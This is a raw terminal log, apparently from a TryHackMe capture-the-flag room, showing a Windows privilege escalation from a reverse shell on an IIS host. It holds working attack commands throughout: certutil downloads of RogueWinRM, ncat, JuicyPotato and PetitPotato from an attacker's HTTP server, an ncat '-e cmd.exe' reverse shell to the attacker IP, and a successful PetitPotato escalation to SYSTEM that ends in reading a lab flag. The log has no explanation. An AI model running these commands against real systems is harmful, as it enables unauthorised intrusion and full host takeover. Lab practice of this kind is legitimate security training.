
```sh
┌──(kali㉿kali)-[~/shells]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.192.99] 49735
Spawn Shell...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>cd c:\windows\temp
cd c:\windows\temp

c:\Windows\Temp>certutil -urlcache -split -f "http://10.18.21.236:8000/tools/RogueWinRM.exe
certutil -urlcache -split -f "http://10.18.21.236:8000/tools/RogueWinRM.exe
****  Online  ****
  000000  ...
  025e00
CertUtil: -URLCache command completed successfully.

c:\Windows\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Windows\Temp

07/26/2024  08:04 AM    <DIR>          .
07/26/2024  08:04 AM    <DIR>          ..
07/25/2020  10:44 AM    <DIR>          AF14FC15-4108-4B19-AD5B-85F1A4CE9DA0-Sigs
07/25/2020  04:16 PM             8,514 Amazon_SSM_Agent_20200725161507.log
07/25/2020  04:16 PM           182,170 Amazon_SSM_Agent_20200725161507_000_AmazonSSMAgentMSI.log
07/25/2020  04:16 PM             1,185 cleanup.txt
07/25/2020  04:16 PM               422 cmdout
07/25/2020  04:16 PM            56,408 minimal_install_output_Sat
07/26/2024  08:01 AM            22,930 MpCmdRun.log
07/25/2020  10:44 AM            23,304 MpSigStub.log
07/26/2024  08:04 AM           155,136 RogueWinRM.exe
07/26/2024  07:51 AM               102 silconfig.log
07/25/2020  04:16 PM                49 stage1-complete.txt
07/25/2020  04:16 PM            29,958 stage1.txt
04/16/2020  04:52 PM           113,328 svcexec.exe
07/25/2020  04:16 PM                67 tmp.dat
              13 File(s)        593,573 bytes
               3 Dir(s)  20,222,242,816 bytes free

c:\Windows\Temp>certutil -urlcache -split -f "http://10.18.21.236:8000/tools/ncat.exe
certutil -urlcache -split -f "http://10.18.21.236:8000/tools/ncat.exe
****  Online  ****
  000000  ...
  239800
CertUtil: -URLCache command completed successfully.

c:\Windows\Temp>C:\Windows\temp\RogueWinRM.exe -p "C:\windows\temp\ncat.exe" -a "-e cmd.exe 10.18.21.236 444"
C:\Windows\temp\RogueWinRM.exe -p "C:\windows\temp\ncat.exe" -a "-e cmd.exe 10.18.21.236 444"

Listening for connection on port 5985 .... 
Error: WinRM already running on port 5985. Unexploitable!
bind failed with error: 10013

c:\Windows\Temp>certutil -urlcache -split -f "http://10.18.21.236:8000/tools/JuicyPotato.exe
certutil -urlcache -split -f "http://10.18.21.236:8000/tools/JuicyPotato.exe
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.

c:\Windows\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Windows\Temp

07/26/2024  08:18 AM    <DIR>          .
07/26/2024  08:18 AM    <DIR>          ..
07/25/2020  10:44 AM    <DIR>          AF14FC15-4108-4B19-AD5B-85F1A4CE9DA0-Sigs
07/25/2020  04:16 PM             8,514 Amazon_SSM_Agent_20200725161507.log
07/25/2020  04:16 PM           182,170 Amazon_SSM_Agent_20200725161507_000_AmazonSSMAgentMSI.log
07/25/2020  04:16 PM             1,185 cleanup.txt
07/25/2020  04:16 PM               422 cmdout
07/26/2024  08:18 AM           347,648 JuicyPotato.exe
07/25/2020  04:16 PM            56,408 minimal_install_output_Sat
07/26/2024  08:11 AM            23,674 MpCmdRun.log
07/25/2020  10:44 AM            23,304 MpSigStub.log
07/26/2024  08:05 AM         2,332,672 ncat.exe
07/26/2024  08:04 AM           155,136 RogueWinRM.exe
07/26/2024  07:51 AM               102 silconfig.log
07/25/2020  04:16 PM                49 stage1-complete.txt
07/25/2020  04:16 PM            29,958 stage1.txt
04/16/2020  04:52 PM           113,328 svcexec.exe
07/25/2020  04:16 PM                67 tmp.dat
              15 File(s)      3,274,637 bytes
               3 Dir(s)  21,036,003,328 bytes free

c:\Windows\Temp>JuicyPotato.exe
JuicyPotato.exe
'JuicyPotato.exe' is not recognized as an internal or external command,
operable program or batch file.

c:\Windows\Temp>JuicyPotato.exe
JuicyPotato.exe
'JuicyPotato.exe' is not recognized as an internal or external command,
operable program or batch file.
```

```sh
c:\Windows\Temp>certutil -urlcache -split -f "http://10.18.21.236:8000/tools/PetitPotato.exe
certutil -urlcache -split -f "http://10.18.21.236:8000/tools/PetitPotato.exe
****  Online  ****
  000000  ...
  123a00
CertUtil: -URLCache command completed successfully.

c:\Windows\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Windows\Temp

07/26/2024  09:21 AM    <DIR>          .
07/26/2024  09:21 AM    <DIR>          ..
07/25/2020  10:44 AM    <DIR>          AF14FC15-4108-4B19-AD5B-85F1A4CE9DA0-Sigs
07/25/2020  04:16 PM             8,514 Amazon_SSM_Agent_20200725161507.log
07/25/2020  04:16 PM           182,170 Amazon_SSM_Agent_20200725161507_000_AmazonSSMAgentMSI.log
07/25/2020  04:16 PM             1,185 cleanup.txt
07/25/2020  04:16 PM               422 cmdout
07/25/2020  04:16 PM            56,408 minimal_install_output_Sat
07/26/2024  09:19 AM            21,726 MpCmdRun.log
07/25/2020  10:44 AM            23,304 MpSigStub.log
07/26/2024  09:21 AM         1,194,496 PetitPotato.exe
07/26/2024  09:08 AM               102 silconfig.log
07/25/2020  04:16 PM                49 stage1-complete.txt
07/25/2020  04:16 PM            29,958 stage1.txt
04/16/2020  04:52 PM           113,328 svcexec.exe
07/25/2020  04:16 PM                67 tmp.dat
              13 File(s)      1,631,729 bytes
               3 Dir(s)  20,262,154,240 bytes free

c:\Windows\Temp>PetitPotato
PetitPotato

Usage: PetitPotato [efsId] <command>

The available efsIds are as follows: 
    [0] EfsRpcOpenFileRaw
    [1] EfsRpcEncryptFileSrv
    [2] EfsRpcDecryptFileSrv
    [3] EfsRpcQueryUsersOnFile
    [4] EfsRpcQueryRecoveryAgents
    [5] EfsRpcRemoveUsersFromFile (Failed)
    [6] EfsRpcAddUsersToFile
    [7] EfsRpcFileKeyInfo
    [8] EfsRpcDuplicateEncryptionInfoFile (Failed)
    [9] EfsRpcAddUsersToFileEx
    [10] EfsRpcFileKeyInfoEx (Failed)
    [11] EfsRpcGetEncryptedFileMetadata (Failed)
    [12] EfsRpcSetEncryptedFileMetadata (Failed)

c:\Windows\Temp>PetitPotato 3 cmd
PetitPotato 3 cmd

[+] Malicious named pipe running on \\.\pipe\petit\pipe\srvsvc.
[+] Invoking EfsRpcQueryUsersOnFile with target path: \\localhost/pipe/petit\C$\wh0nqs.txt.
[+] The connection is successful.
[+] ImpersonateNamedPipeClient OK.
[+] OpenThreadToken OK.
[+] DuplicateTokenEx OK.
[+] CreateProcessAsUser OK.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd c:\users
cd c:\users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users

07/25/2020  02:03 PM    <DIR>          .
07/25/2020  02:03 PM    <DIR>          ..
07/25/2020  08:05 AM    <DIR>          .NET v4.5
07/25/2020  08:05 AM    <DIR>          .NET v4.5 Classic
07/25/2020  10:30 AM    <DIR>          Administrator
07/25/2020  02:03 PM    <DIR>          Bob
07/25/2020  07:58 AM    <DIR>          Public
               0 File(s)              0 bytes
               7 Dir(s)  21,045,534,720 bytes free

c:\Users>cd administrator
cd administrator

c:\Users\Administrator>cd desktop
cd desktop

c:\Users\Administrator\Desktop>type Root.txt
type Root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
c:\Users\Administrator\Desktop>
```

